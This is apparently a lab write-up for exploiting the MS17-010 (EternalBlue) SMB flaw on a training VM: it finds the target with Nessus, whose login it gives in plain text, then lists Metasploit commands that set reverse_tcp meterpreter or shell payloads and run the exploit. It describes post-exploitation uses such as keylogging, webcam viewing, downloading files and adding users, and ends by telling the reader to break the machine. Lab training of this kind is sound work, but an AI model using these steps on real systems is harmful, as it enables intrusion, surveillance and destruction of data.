EternalBlue Writeup.
Open Nessus on Slingshot VM (localhost:8834 ) UN: root PW: !nessuspw!
Go to scans and look at recent scan
Identify the vulnerable host (VULNERABLE TO MS17_010)
Open Metasploit- msfconsole in terminal
Type:
use exploit/windows/smb/ms17_010_psexec 
set RHOST [IP OF VULNERABLE HOST]
set PAYLOAD windows/meterpreter/reverse_tcp or set PAYLOAD windows/shell/reverseTCP
exploit

or                                                                                   				                 use exploit/windows/smb/ms17_010_eternalblue
set RHOST [IP OF VULNERABLE HOST]
set VerifyTarget false
exploit

Using ms17_010_eternalblue will bluescreen the victim- a good demonstration of what can happen if you aren’t careful when pentesting- VM can be restarted as soon as blue screen shows up
Using payload meterpreter will open a meterpreter shell which allows for keylogging, webcam viewing and others. Type help in the meterpreter prompt for a list of commands
GetUid in meterpreter will show what user is currently being used.
Using shell payload will open a command prompt window- allows to view files, download files and perform remote commands such as adding users.








Exploit
Use Nessus (go to localhost:8834 in firefox) to identify the vulnerable host UN:root PW:!nessuspw!`
Use Metasploit framework to attack the host using the identified vulnerability (SAME AS NHS HACK )with either windows/meterpreter/reverse_tcp or windows/shell/reverse_tcp
Break the machine when you’re in.
